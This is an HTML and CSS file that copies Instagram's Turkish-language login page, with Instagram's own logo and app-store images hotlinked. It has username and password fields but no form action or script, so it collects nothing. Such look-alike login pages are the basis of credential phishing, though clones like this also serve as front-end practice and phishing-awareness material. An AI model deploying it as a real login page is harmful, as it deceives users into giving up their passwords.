<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş Yap • Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #000000;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }

        .login-container {
            width: 100%;
            max-width: 350px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .box {
            background-color: #000000;
            border: 1px solid #262626;
            padding: 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo {
            margin-bottom: 30px;
            filter: invert(1); /* Logoyu beyaz yapar */
            width: 175px;
        }

        form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 6px;
        }

        input {
            width: 100%;
            padding: 10px;
            background: #121212;
            border: 1px solid #363636;
            border-radius: 3px;
            color: white;
            font-size: 12px;
        }

        input:focus {
            border-color: #a8a8a8;
            outline: none;
        }

        .login-btn {
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 7px;
            font-weight: 600;
            margin-top: 8px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .login-btn:hover {
            background-color: #1877f2;
        }

        .divider {
            display: flex;
            width: 100%;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .divider::before, .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #262626;
        }

        .divider span {
            padding: 0 18px;
        }

        .fb-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            margin-bottom: 15px;
        }

        .forgot-password {
            font-size: 12px;
            color: #e0e0e0;
            text-decoration: none;
        }

        .signup-box {
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }

        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        .get-app {
            text-align: center;
            font-size: 14px;
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="box">
            <img class="logo" src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d2529dbef1aa.png" alt="Instagram">
            
            <form>
                <input type="text" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
                <input type="password" placeholder="Şifre" required>
                <button type="submit" class="login-btn">Giriş Yap</button>
            </form>

            <div class="divider">
                <span>YA DA</span>
            </div>

            <a href="#" class="fb-login">Facebook ile Giriş Yap</a>
            <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
        </div>

        <div class="box signup-box">
            <span>Hesabın yok mu? <a href="#">Kaydol</a></span>
        </div>

        <div class="get-app">
            <p style="margin-bottom: 15px;">Uygulamayı indir.</p>
            <div style="display: flex; gap: 8px; justify-content: center;">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym_f0n.png" alt="Google Play" height="40">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6Q1E6Ybh.png" alt="Microsoft" height="40">
            </div>
        </div>
    </div>

</body>
</html>
